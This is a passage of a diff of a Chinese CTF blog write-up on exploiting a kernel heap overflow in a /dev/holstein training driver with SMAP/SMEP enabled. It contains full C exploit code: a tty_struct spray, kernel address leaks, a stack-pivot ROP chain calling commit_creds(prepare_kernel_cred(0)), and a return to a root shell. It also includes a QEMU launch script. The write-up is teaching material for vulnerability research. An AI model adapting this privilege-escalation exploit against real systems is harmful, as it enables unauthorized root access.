class="hljs-string">&quot;g_buf:0x%lx\n&quot;</span>, g_buf);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> kernel_addr = p[<span class="hljs-number">0x83</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;kernel_addr:0x%lx\n&quot;</span>, kernel_addr);<br>    kernel_base = kernel_addr - <span class="hljs-number">0xc38880</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;kernel_base:0x%lx\n&quot;</span>, kernel_base);<br>    p[<span class="hljs-number">0xc</span>] = lpe;<br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)&amp;buf[<span class="hljs-number">0x418</span>] = g_buf;<br>    write(fd, buf, <span class="hljs-number">0x500</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) &#123;<br>       ioctl(spray[i], <span class="hljs-number">0xdeadbeef</span>, <span class="hljs-number">0xcafebabe</span>);<br>    &#125;       <br>&#125;<br></code></pre></td></tr></table></figure>
 
 <h2 id="开启SMAP与SMEP"><a href="#开启SMAP与SMEP" class="headerlink" title="开启SMAP与SMEP"></a>开启SMAP与SMEP</h2><p><code>SMAP</code>与<code>SMEP</code>会防止内核访问与执行用户空间的地址，但是由于该题本身是修改在堆块内的指针值无法在堆块内部构造ROP链，那么想要执行ROP链那么需要将栈迁移到堆上。但是由于我们的输入不在栈上，而是在堆上，无法通过<code>pop rbp;ret;</code>与<code>mov rsp,rbp</code>去修改栈顶值。这里需要注意到，当通过<code>ioctl</code>函数时，我们的参数值实际也会被传递进去。如下图所示。</p>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309081834498.png" srcset="/img/loading.gif" lazyload alt="image-20230908134614606"></p>
+<p><img src="https://s2.loli.net/2024/03/18/qaBysvulV1nmkZt.png" srcset="/img/loading.gif" lazyload alt="image-20230908134614606"></p>
 <p>因此需要通过根据这几个寄存器修改栈顶的操作</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat g | grep -E &quot;push rdx;.* pop rsp;.* ret&quot;<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309081834499.png" srcset="/img/loading.gif" lazyload alt="image-20230908135835922"></p>
+<p><img src="https://s2.loli.net/2024/03/18/vYDQ7RUty5mFG82.png" srcset="/img/loading.gif" lazyload alt="image-20230908135835922"></p>
 <p>该<code>gadget</code>可以将<code>rax</code>的值移动到<code>rdi</code>的值，但是需要经过<code>rep movsq qword ptr [rdi], qword ptr [rsi]; ret;</code>，该汇编语言实际是循环将<code>rsi</code>指向的值存放到<code>rdi</code>中，并且循环此为由<code>rcx</code>寄存器指定，因此将<code>rcx</code>寄存器设置为0即可跳过该操作。</p>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309081834500.png" srcset="/img/loading.gif" lazyload alt="image-20230908173447236"></p>
+<p><img src="https://s2.loli.net/2024/03/18/jAVWJFKQyNlvZS4.png" srcset="/img/loading.gif" lazyload alt="image-20230908173447236"></p>
 <h3 id="run-sh-2"><a href="#run-sh-2" class="headerlink" title="run.sh"></a>run.sh</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br>qemu-system-x86_64 \<br>    -m 64M \<br>    -nographic \<br>    -kernel bzImage \<br>    -append &quot;console=ttyS0 loglevel=3 oops=panic panic=-1  nopti kaslr&quot; \<br>    -no-reboot \<br>    -cpu qemu64,+smap,+smep \<br>    -smp 1 \<br>    -monitor /dev/null \<br>    -initrd initramfs.cpio.gz\<br>    -net nic,model=virtio \<br>    -net user \<br>    -s<br></code></pre></td></tr></table></figure>
 
 <h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">0xffffffff810d748d: pop rdi; ret; </span><br><span class="hljs-comment">0xffffffff81022dff: iretq; pop rbp; ret;</span><br><span class="hljs-comment">0xffffffff8162668e: swapgs; ret;</span><br><span class="hljs-comment">0xffffffff813a478a: push rdx; mov ebp, 0x415bffd9; pop rsp; pop r13; pop rbp; ret;</span><br><span class="hljs-comment">0xffffffff8162707b: mov rdi, rax; rep movsq qword ptr [rdi], qword ptr [rsi]; ret;</span><br><span class="hljs-comment">0xffffffff8109c39e: pop rsi; ret;</span><br><span class="hljs-comment">0xffffffff8113c1c4: pop rcx; ret;</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prepare_kernel_cred_offset 0x74650</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> commit_creds_offset 0x744b0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pop_rdi_offset 0xd748d</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> iretq_pop_rbp_offset 0x22dff</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> push_rax_ret_offset 0x24819 </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> push_rdx_pop_rsp_ret_offset 0x3a478a</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> mov_rdi_rax_ret_offset 0x62707b</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> swapgs 0x62668e</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pop_rsi 0x9c39e</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pop_rcx 0x13c1c4</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> kernel_base;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> prepare_kernel_cred;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> commit_creds;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> user_cs, user_sp, user_ss, user_rflags;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">save_user_land</span><span class="hljs-params">()</span><br>&#123;<br>	__asm__(<br>		<span class="hljs-string">&quot;.intel_syntax noprefix;&quot;</span><br>		<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>		<span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>		<span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>		<span class="hljs-string">&quot;pushf;&quot;</span><br>		<span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>		<span class="hljs-string">&quot;.att_syntax;&quot;</span><br>	);<br>	<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Saved userland registers&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[#] cs: 0x%lx \n&quot;</span>, user_cs);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[#] ss: 0x%lx \n&quot;</span>, user_ss);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[#] rsp: 0x%lx \n&quot;</span>, user_sp);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[#] rflags: 0x%lx \n\n&quot;</span>, user_rflags);<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">backdoor</span><span class="hljs-params">()</span><br>&#123;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;****getshell****&quot;</span>);<br>	system(<span class="hljs-string">&quot;id&quot;</span>);<br>	system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    save_user_land();<br>    <span class="hljs-type">int</span> spray[<span class="hljs-number">100</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">50</span>; i++)<br>        spray[i] = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, O_RDONLY | O_NOCTTY);<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/holstein&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">50</span>; i &lt; <span class="hljs-number">100</span>; i++)<br>        spray[i] = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, O_RDONLY | O_NOCTTY);<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x500</span>];<br>    read(fd, buf, <span class="hljs-number">0x500</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> * p = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)&amp;buf;<br>    <span class="hljs-comment">//for (int i = 0; i &lt; 0xa0; i++)</span><br>    <span class="hljs-comment">//	printf(&quot;[0x%x] 0x%lx\n&quot;,i ,p[i]);</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> heap = p[<span class="hljs-number">0x9f</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;heap:0x%lx\n&quot;</span>, heap);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> g_buf = heap - <span class="hljs-number">0x4f8</span> ;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;g_buf:0x%lx\n&quot;</span>, g_buf);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> kernel_addr = p[<span class="hljs-number">0x83</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;kernel_addr:0x%lx\n&quot;</span>, kernel_addr);<br>    kernel_base = kernel_addr - <span class="hljs-number">0xc38880</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;kernel_base:0x%lx\n&quot;</span>, kernel_base);<br>    p[<span class="hljs-number">0x22</span>] = pop_rdi_offset + kernel_base;<br>    p[<span class="hljs-number">0x23</span>] = <span class="hljs-number">0</span>;<br>    p[<span class="hljs-number">0x24</span>] = prepare_kernel_cred_offset + kernel_base;<br>    p[<span class="hljs-number">0x25</span>] = pop_rcx + kernel_base;<br>    p[<span class="hljs-number">0x26</span>] = <span class="hljs-number">0</span>;<br>    p[<span class="hljs-number">0x27</span>] = mov_rdi_rax_ret_offset + kernel_base;<br>    p[<span class="hljs-number">0x28</span>] = commit_creds_offset + kernel_base;<br>    p[<span class="hljs-number">0x29</span>] = swapgs + kernel_base;<br>    p[<span class="hljs-number">0x2a</span>] = iretq_pop_rbp_offset + kernel_base;<br>    p[<span class="hljs-number">0x2b</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)backdoor;<br>    p[<span class="hljs-number">0x2c</span>] = user_cs;<br>    p[<span class="hljs-number">0x2d</span>] = user_rflags;<br>    p[<span class="hljs-number">0x2e</span>] = user_sp;<br>    p[<span class="hljs-number">0x2f</span>] = user_ss;    <br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)&amp;buf[<span class="hljs-number">0x418</span>] = g_buf;<br>    p[<span class="hljs-number">0xc</span>] = p[<span class="hljs-number">0xc</span>] = kernel_base + push_rdx_pop_rsp_ret_offset;<br>    write(fd, buf, <span class="hljs-number">0x500</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) &#123;<br>       ioctl(spray[i], g_buf+<span class="hljs-number">0x100</span>, g_buf+<span class="hljs-number">0x100</span>);<br>    &#125;       <br>&#125;<br></code></pre></td></tr></table></figure>
@@ -433,34 +432,6 @@
             <div>
               <div class="post-metas my-3">
   
-    <div class="post-meta mr-3 d-flex align-items-center">
-      <i class="iconfont icon-category"></i>
-      
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/kernel/" class="category-chain-item">kernel</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-    </div>
-  
-  
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/kernel/">#kernel</a>
-      
-    </div>
   
 </div>
 
@@ -470,7 +441,7 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Kernel-Pwn-HeapOverflow</div>
+      <div></div>
       <div>https://h0pe-ay.github.io/Kernel-Pwn-heapoverflow/</div>
     </div>
     <div class="license-meta">
@@ -483,7 +454,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年9月8日</div>
+          <div>2024年3月18日</div>
         </div>
       
       
@@ -515,9 +486,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/KernelPwn-AAR&amp;AAW/" title="Kernel-Pwn-AAR&amp;AAW">
+                      <a href="/ret2dir/" title="">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Kernel-Pwn-AAR&amp;AAW</span>
+                        <span class="hidden-mobile"></span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -525,8 +496,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/ETW-Microsoft-Windows-Kernel-File/" title="ETW-Microsoft-Windows-Kernel-File">
-                        <span class="hidden-mobile">ETW-Microsoft-Windows-Kernel-File</span>
+                      <a href="/%E5%88%A9%E7%94%A8modprobe_path%E6%8F%90%E6%9D%83/" title="">
+                        <span class="hidden-mobile"></span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
